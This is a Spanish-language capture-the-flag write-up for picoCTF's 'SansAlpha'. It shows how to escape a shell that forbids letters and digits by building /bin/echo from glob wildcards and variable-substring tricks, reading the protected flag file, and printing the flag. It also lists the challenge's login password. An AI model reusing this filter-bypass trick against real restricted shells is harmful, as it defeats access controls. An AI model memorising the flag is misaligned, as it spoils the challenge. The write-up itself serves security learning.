## SansAlpha
# Descripción
The Multiverse is within your grasp! Unfortunately, the server that contains the secrets of the multiverse is in a universe where keyboards only have numbers and (most) symbols.
`ssh -p 64527 ctf-player@mimas.picoctf.net`
Use password: `1db87a14`
# Solución
La restricción de este reto es no poder ingresar ningún carácter alfanúmerico, por lo que estamos limitados en cuanto a comandos.

Descubriremos la ubicación de la flag al usar el comando `./*/`
```
SansAlpha$ ./*/*
bash: ./blargh/flag.txt: Permission denied
```

Ahora lo que haremos será construir el comando **/bin/echo**, terminando de esta forma: `/???/?${_1:9:1}?${_1:10:1}`

Y ahora que tenemos ese comando construido, simplemente usamos este otro que imprimirá el texto 'return 0' seguido de la bandera
```
SansAlpha$ /???/?${_1:9:1}?${_1:10:1} "$(<./*/????.???)"
return 0 picoCTF{7h15_mu171v3r53_15_m4dn355_4945630a}
```

picoCTF{7h15_mu171v3r53_15_m4dn355_4945630a}
# Notas adicionales
- 
# Referencias
